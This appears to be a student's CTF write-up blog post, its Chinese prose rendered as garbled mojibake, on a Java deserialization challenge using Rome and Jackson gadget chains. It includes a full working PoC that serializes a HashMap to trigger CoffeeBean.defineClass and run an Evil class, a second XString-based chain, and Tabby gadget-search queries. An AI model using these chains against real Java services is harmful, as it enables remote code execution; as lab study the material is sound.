---
layout: post
title: hashmapååºåˆ—åŒ–#equals
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: 
---





### å‰è¨€

```java
æœ€è¿‘å‘ç°è‡ªå·±å¯¹æ‰“CTFçš„çƒ­æƒ…é€æ¸å‡å°‘äº†ï¼ˆå¯èƒ½æ˜¯è‡ªå·±å¤§ä¸‰äº†å”‰è€äº†ï¼‰ï¼Œä½†å´å¯¹è¯¾æœ¬è¶Šæ¥è¶Šæ„Ÿå…´è¶£äº†ï¼Œä½†å¯¹æˆ‘çš„javaçƒ­æƒ…ä¹Ÿæå…·å¢é«˜ï¼Œå°¤å…¶æ˜¯æœ€è¿‘å¤šäº†tabbyè¿™ä¸ªçˆ±å¦ƒé«˜å…´äº†å¥½å‡ å¤©äº†ï¼Œæ¥ä¸‹æ¥å°±å­¦å­¦å¦‚ä½•ä½¿ç”¨å¥¹
```

### æ­£æ–‡

ğŸ˜âœŒçœŸå¥½é™„ä»¶ç›´æ¥ç»™å‡ºäº†ï¼Œä¸ç”¨è´¹å·¥å¤«å»æ‰¾é™„ä»¶äº†ã€‚

å¤‡ç”¨ï¼š[b4bycoffee_f18028284cae793d0b1da80146f01bd0.zip](https://l3yx.github.io/resource/b4bycoffee_f18028284cae793d0b1da80146f01bd0.zip)

```java
rome 1.7
Springboot
jackson
```

è€ƒå¯Ÿçš„romeååºåˆ—åŒ–ï¼Œromeç»å…¸æ‰“æ³•å°±æ˜¯ç›´æ¥ signObjectäºŒæ¬¡ååºåˆ—åŒ–

![image-20231126180340425](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231126180340425.png)

#### Hashmap+Rome

```java
HashMap::readObject->hash->key.hashcode
ObjectBean::hashCode
       EqualsBean::beanHashCode
                     ObjectBean::toString()
                            ToStringBean::toString() 
                                   ToStringBean::toString()æ–¹æ³•ä¸­çš„ invokeæ‰§è¡Œ
```

#### äºŒæ¬¡ååºåˆ—åŒ–

 ```java
 getObject:177, SignedObject (java.security)
 invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 invoke:62, NativeMethodAccessorImpl (sun.reflect)
 invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 invoke:498, Method (java.lang.reflect)
 beanEquals:146, EqualsBean (com.sun.syndication.feed.impl)
 equals:103, EqualsBean (com.sun.syndication.feed.impl)
 equals:495, AbstractMap (java.util)
 reconstitutionPut:1241, Hashtable (java.util)
 readObject:1215, Hashtable (java.util)
 ```



### æˆ‘å°±è¯´å¥½ç†Ÿæ‚‰ï¼Œæœä¸å…¶ç„¶å‰å‡ å¤©åˆšé‡åˆ°ï¼Œæˆ‘ä¸¢è¿™å‡ºé¢˜åªæŠŠkryoåºåˆ—åŒ–æ”¹æˆäº†æ™®é€šçš„åºåˆ—åŒ–ï¼ï¼ï¼

![image-20231126182642622](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231126182642622.png)

ä¸Šæ¬¡çš„é¢˜æ˜¯ kryo+romeäºŒæ¬¡ååºåˆ—åŒ–åšçš„ï¼Œè¿™é“é¢˜å¤šäº†ä¸€ä¸ªé»‘åå•çš„é™åˆ¶

![image-20231126182906479](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231126182906479.png)

å¯¹æ¯”è€Œè¨€å¡çš„æ˜¯äºŒæ¬¡ååºåˆ—åŒ–åé¢çš„ç±»ï¼ŒäºŒæ¬¡ååºåˆ—åŒ–è¿˜æ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œçš„

### `æ­¤æ—¶ç–‘é—®ï¼šäºŒæ¬¡ååºåˆ—åŒ–çš„é“¾å­è¿˜ä¼šè¢«æ‹¦æˆªå˜›`

è¯•äº†è¿™ç§resolveClassæ˜¯ä¼šè¢«æ‹¦æˆªçš„

![image-20231126193430531](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231126193430531.png)

é‚£å°±æ˜¯æ”¹è¿™ä¸ªäºŒæ¬¡ååºåˆ—åŒ–åçš„ç»“æœï¼Œéƒ½ç¦äº†ã€‚ã€‚ã€‚

```java
HashMap::readObject->hash->key.hashcode
ObjectBean::hashCode
       EqualsBean::beanHashCode
                     ObjectBean::toString()
                            ToStringBean::toString() 
                                   ToStringBean::toString()æ–¹æ³•ä¸­çš„ invokeæ‰§è¡Œ
```

æ‰¾äº†ä¸€ä¸‹hessianåŸç”Ÿjdké“¾å­ç¼ºå°‘ä¾èµ–ä¹Ÿæ‰“ä¸é€š

## æ²¡æ€è·¯äº†çœ‹çœ‹å…¶ä»–ç»™å‡ºçš„ç±» 

ç»™äº†ä¸€ä¸ªCoffeeBeanç±»å®ç°åºåˆ—åŒ– æ¥å£ï¼Œå¹¶ä¸”æœ‰toStringæ–¹æ³•å¯ä»¥æ‰§è¡Œä»»ä½•ä»£ç ï¼Œæ‰€ä»¥å‡ºå£è‚¯å®šæ˜¯è°ƒç”¨CoffeeBean#toStringæ–¹æ³•ï¼Œå¹¶ä¸”åå°„ä¿®æ”¹ClassByteçš„å€¼

```java
public class CoffeeBean extends ClassLoader implements Serializable {
    private String name = "Coffee bean";
    private byte[] ClassByte;

    public String getName() {
        return this.name;
    }

    public void setName(String name) {
        this.name = name;
    }

    @Override // java.lang.Object
    public String toString() {
        try {
            new CoffeeBean().defineClass(null, this.ClassByte, 0, this.ClassByte.length).newInstance();
            return "A cup of Coffee --";
        } catch (IllegalAccessException var6) {
            var6.printStackTrace();
            return "A cup of Coffee --";
        } catch (InstantiationException var5) {
            var5.printStackTrace();
            return "A cup of Coffee --";
        }
    }
}
```

```java
HashMap::readObject->hash->key.hashcode
EqualsBean::hashCode//ä¹Ÿæ²¡äº†
       EqualsBean::beanHashCode  //åˆ°è¿™é‡Œéƒ½æ²¡è¢«è¿‡æ»¤
           
           
           
                     ObjectBean::toString()  //ä¸‹é¢å…¨è¿‡æ»¤äº†
                            ToStringBean::toString() 
                                   ToStringBean::toString()æ–¹æ³•ä¸­çš„ invokeæ‰§è¡Œ
```

ï¼Ÿï¼Ÿï¼Ÿè¿™ä¸æ˜¯ç›´æ¥é€šäº†å˜›è¿™æ¡é“¾å­

```java
HashMap#readObject
    EqualsBean#hashCode
       EqualsBean#beanHashCode
            CoffeeBean#toString
æ— è¯­ã€‚ã€‚ã€‚çƒ‚é¢˜
```

![image-20231126201132614](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231126201132614.png)

æœ¬åœ°æå®Œäº†ï¼Œé‡åˆ°çš„å‘ç‚¹

```java
å¦‚æœç›´æ¥ç”¨hashmap.putï¼Œå°±ä¼šç›´æ¥è§¦å‘hashcode...ï¼Œç”¨åˆ°åˆšå†™çš„é‚£ç¯‡æ–‡ç« åå°„æ„å»ºhashmapï¼ˆç¾æ»‹æ»‹ï¼‰
```

![image-20231126204344138](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231126204344138.png)

ä¸ºæ•°ä¸å¤šçš„ä¸€æ¬¡æˆåŠŸï¼Œå“ˆå“ˆå“ˆå½“ç„¶æ˜¯å› ä¸ºç®€å•ã€‚

![image-20231126204758890](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231126204758890.png)

å…ˆè´´ä¸€ä¸‹poc

```java
package com.example.b4bycoffee.controller;

import com.example.b4bycoffee.model.CoffeeBean;
import com.rometools.rome.feed.impl.EqualsBean;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;

public class poc {
    public static String string;
    public static void main(String[] args) throws Exception {
        Path path= Paths.get("C:\\Users\\c'x'k\\Desktop\\CTF\\2022é•¿åŸæ¯ bycoffee\\Evil.class");
        byte[] bytes= Files.readAllBytes(path);
        CoffeeBean coffeeBean=new CoffeeBean();
        Field classByte = coffeeBean.getClass().getDeclaredField("ClassByte");
        classByte.setAccessible(true);
        classByte.set(coffeeBean,bytes);



        EqualsBean equalsBean=new EqualsBean(Object.class,coffeeBean);



//        HashMap hashMap=new HashMap();
//        hashMap.put(equalsBean,"aa");


        HashMap hashMap=new HashMap();
        setFieldValue(hashMap, "size", 1);
        Class nodeC;
        nodeC = Class.forName("java.util.HashMap$Node");
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 1);
        //åˆ›å»ºä¸€ä¸ªæ•°ç»„
        Array.set(tbl, 0, nodeCons.newInstance(0, equalsBean, "whatever", null));
        setFieldValue(hashMap, "table", tbl);

        serialize(hashMap);
        System.out.println(string);
        unserialize();
    }
    public static void serialize(Object object) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        string = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }
    public static void unserialize() throws Exception {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string));
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
    public static void setFieldValue(Object obj,String name,Object newobj) throws NoSuchMethodException, NoSuchFieldException, IllegalAccessException {
        Field declaredField = obj.getClass().getDeclaredField(name);
        declaredField.setAccessible(true);
        declaredField.set(obj,newobj);

    }
}

```

Evil.java

```java
import java.io.IOException;

public class Evil {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
    public static void main(String[] args) throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}

```

#### `defineClassä¼šè§¦å‘é™æ€æ–¹æ³•ï¼ï¼ï¼`

## æ¥ä¸‹æ¥çœ‹çœ‹ä½¬ä»¬å¦‚ä½•æ‰¾æ–°çš„é“¾å­

tabbyå¯åŠ¨ï¼Œé¦–å…ˆè‚¯å®šæ˜¯å…ˆç”Ÿæˆæ•°æ®åº“

### Case1 (HashMap -> HotSwappableTargetSource.equals -> XString.equals -> .toString)

å•Šè¿™æ¡é“¾å­ï¼Œæœ€è¿‘å­¦çš„éƒ½ç”¨ä¸Šæ¥æï¼Œçœ‹çœ‹æ€ä¹ˆæ‰¾åˆ°çš„ï¼Œåªä¼šåˆ©ç”¨ä¸ä¼šæ‰¾

```java
match (source:Method {NAME:"readObject",CLASSNAME:"java.util.HashMap"})
match (sink:Method {NAME0:"com.example.b4bycoffee.model.CoffeeBean.toString"})
with source, collect(sink) as sinks
//é€šè¿‡å°† sink èŠ‚ç‚¹å½’é›†åˆ° sinks åˆ—è¡¨ä¸­ï¼Œåç»­çš„æ“ä½œå¯ä»¥é’ˆå¯¹æ•´ä¸ªåˆ—è¡¨è¿›è¡Œå¤„ç†
call tabby.algo.findJavaGadget(source, sinks, 8, false, false) yield path
    //
where none(n in nodes(path) where 
    n.NAME0 in ["com.sun.xml.internal.ws.api.BindingID.equals","org.yaml.snakeyaml.events.Event.equals","com.sun.corba.se.spi.orb.OperationFactory$OperationBase.equals","org.springframework.cache.interceptor.CacheOperation.equals","javax.swing.text.html.HTML$UnknownTag.equals"]
)
return path limit 1
```

è¿™é‡Œé‡åˆ°äº†é—®é¢˜ã€‚å®ƒä¸æŠ¥é”™ä½†å°±æ˜¯æ‰¾ä¸åˆ°ï¼Œèµ·åˆæ€€ç–‘æ²¡å¯¼å…¥è¿›æ¥ï¼Œä½†æ˜¯coffeeé‚£ä¸ªç±»å´å­˜åœ¨

![image-20231126215332809](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231126215332809.png)



```java
match (source:Method {NAME:"readObject",CLASSNAME:"java.util.HashMap"})
match (sink:Method {NAME0:"com.example.b4bycoffee.model.CoffeeBean.toString"})
with source, collect(sink) as sinks
 
match (source:Method {NAME:"toString",CLASSNAME:"com.com.example.b4bycoffee.model.CoffeeBean"})
```





```java
match (source:Method {NAME:"readObject",CLASSNAME:"java.util.HashMap"})
match (sink:Method {NAME0:"com.example.b4bycoffee.model.CoffeeBean.toString"})<-[:CALL]-(m1:Method)
call apoc.algo.allSimplePaths(m1, source, "<CALL|ALIAS", 20) yield path 
return * limit 20
```

è¿™é‡Œéƒ½æ²¡æˆåŠŸ æ€€ç–‘æ˜¯ CLASSNAMEçš„é—®é¢˜

![image-20231126221129844](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231126221129844.png)



```java
match (source:Method {NAME:"readObject",CLASSNAME:"com.sun.org.apache.xerces.internal.dom.NamedNodeMapImpl"}) return source
```

### stop

tnndæˆ‘å°±è¯´ä¸å¤ªå¯¹åŠ²ç›´æ¥æ¢äº†ä¸ªæœ€æ–°çš„ç‰ˆæœ¬ï¼Œæ—§çš„ç‰ˆæœ¬ä¸æ”¯æŒæœå•¦

è¿˜æœ‰ä¸€ä¸ªå‘å°±æ˜¯ä¸€å®šè¦é…ç½®è¿™äº›ç´¢å¼•ï¼Œäº²èº«ç»å†æ•™è®­æ²¡é…ç½®ï¼Œä»ä¸­åˆè·‘åˆ°äº†ä¸‹åˆç¡¬æ˜¯æ²¡è·‘å®Œï¼Œé…ç½®äº†2åˆ†é’Ÿè·‘å®Œã€‚ã€‚ã€‚

```java
CREATE CONSTRAINT c1 IF NOT EXISTS FOR (c:Class) REQUIRE c.ID IS UNIQUE;
CREATE CONSTRAINT c2 IF NOT EXISTS FOR (c:Class) REQUIRE c.NAME IS UNIQUE;
CREATE CONSTRAINT c3 IF NOT EXISTS FOR (m:Method) REQUIRE m.ID IS UNIQUE;
CREATE CONSTRAINT c4 IF NOT EXISTS FOR (m:Method) REQUIRE m.SIGNATURE IS UNIQUE;
CREATE INDEX index1 IF NOT EXISTS FOR (m:Method) ON (m.NAME);
CREATE INDEX index2 IF NOT EXISTS FOR (m:Method) ON (m.CLASSNAME);
CREATE INDEX index3 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.CLASSNAME);
CREATE INDEX index4 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.NAME0);
CREATE INDEX index5 IF NOT EXISTS FOR (m:Method) ON (m.SIGNATURE);
CREATE INDEX index6 IF NOT EXISTS FOR (m:Method) ON (m.NAME0);
CREATE INDEX index7 IF NOT EXISTS FOR (m:Method) ON (m.NAME0, m.CLASSNAME);
:schema //æŸ¥çœ‹è¡¨åº“
:sysinfo //æŸ¥çœ‹æ•°æ®åº“ä¿¡æ¯	
```

```java
DROP CONSTRAINT c1;
DROP CONSTRAINT c2;
DROP CONSTRAINT c3;
DROP CONSTRAINT c4;
DROP INDEX index1;
DROP INDEX index2;
DROP INDEX index3;
DROP INDEX index4;
DROP INDEX index5;
DROP INDEX index6;
DROP INDEX index7;
```

```java
match (source:Method {NAME:"readObject",CLASSNAME:"java.util.HashMap"})
match (sink:Method {NAME0:"com.example.b4bycoffee.model.CoffeeBean.toString"})
with source, collect(sink) as sinks
call tabby.algo.findJavaGadget(source, sinks, 8, false, false) yield path
return path limit 1
```

å®ç° ä»readObject-->toStringçš„è°ƒç”¨ï¼Œæ·±åº¦ä¸º8ï¼Œè¿™é‡Œé‡è¦çš„æ˜¯NAME0ï¼Œæ˜¯æ ¹æ®Methodçš„æ–¹æ³•æ¥æ„é€ çš„

![image-20231127194517411](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231127194517411.png)

![image-20231127193652846](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231127193652846.png)

ç»™äº†ä¸€ä¸ªè¿™ä¸ªç±»ï¼Œä½†æ ¹æ®ç°å®è°ƒè¯•æ—¶è§¦å‘ä¸åˆ°toStringæ–¹æ³•çš„

![image-20231127195927538](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231127195927538.png)

æ€ªä¸å¾—è¦é™åˆ¶è·¯å¾„

![image-20231127200040315](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231127200040315.png)

å‘ç°å¾ˆå¤šæ–¹æ³•éƒ½æ˜¯è°ƒç”¨åˆ°äº† Objectçš„toStringä½†å¯¹è±¡ä¸å¯æ§ï¼Œæ‰€ä»¥å°±æ˜¯è¯¯æŠ¥

å‡ºç°äº†ä¸€ä¸ªæƒ…å†µå°±æ˜¯æœ‰çš„ç±»å¹¶æ²¡æœ‰åŠ å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œæ¯”å¦‚XStringï¼Œå°è¯•åŠå¤©ä¹Ÿæœªè§£å†³åº”è¯¥ä¹Ÿå¯ä»¥æŠŠjaråŒ…ç»§ç»­åŠ è¿›å»



ç„¶åçœ‹æ–‡ç« ç§âœŒä¹Ÿæ˜¯æ‰¾åˆ°äº†ä¸€ä¸ªæ–°çš„æ–¹æ³•.æˆ‘çš„å›¾ç§æ˜¯æœ‰ObjectIdGeneratorè¿™ä¸ªç±»çš„ï¼Œä½†åªæ˜¯æ²¡æœ‰XString

```java
toString(), CoffeeBean (com.example.b4bycoffee.model)
equals(Object), XString (com.sun.org.apache.xpath.internal.objects)
equals(Object), ObjectIdGenerator$IdKey (com.fasterxml.jackson.annotation)
putVal(int, Object, Object, boolean, boolean), HashMap (java.util)
readObject(ObjectInputStream), HashMap (java.util)
```

```java
CoffeeBean coffeeBean = new CoffeeBean();
Tool.setFieldValue(coffeeBean, "ClassByte", Tool.getCMDByteCodes("touch /tmp/success"));

XString xString = new XString("");

ObjectIdGenerator.IdKey idKey1 = new ObjectIdGenerator.IdKey(Object.class,Object.class,xString);
ObjectIdGenerator.IdKey idKey2 = new ObjectIdGenerator.IdKey(Object.class,Object.class,coffeeBean);
Tool.setFieldValue(idKey1,"hashCode",0);
Tool.setFieldValue(idKey2,"hashCode",0);

HashMap<Object,Object> hashMap = new HashMap<Object,Object>();
hashMap.put(idKey1, "1");
hashMap.put(idKey2, "2");

String poc = Tool.encodeBase64(Tool.serialize(hashMap));
```

åŠå¼€åŠå°±çš„ç»“æŸäº†ã€‚ğŸ¥ºğŸ¥ºğŸ¥ºæ„Ÿè§‰è¿™ç§è‡ªåŠ¨åŒ–å·¥å…·è¿˜æ˜¯æ¯”è¾ƒä¾é åç«¯æ—¶å¦‚ä½•å†™çš„ï¼Œä¸ç„¶æœ‰äº›é“¾å­æ ¹æœ¬æ‰¾ä¸åˆ°ã€‚ä½†æ˜¯è‡ªåŠ¨åŒ–å·¥å…·æä¾›äº†ä¸€ä¸ªå¥½çš„æ€è·¯å¹¶ä¸”æ›´åŠ å¿«æ·ã€‚
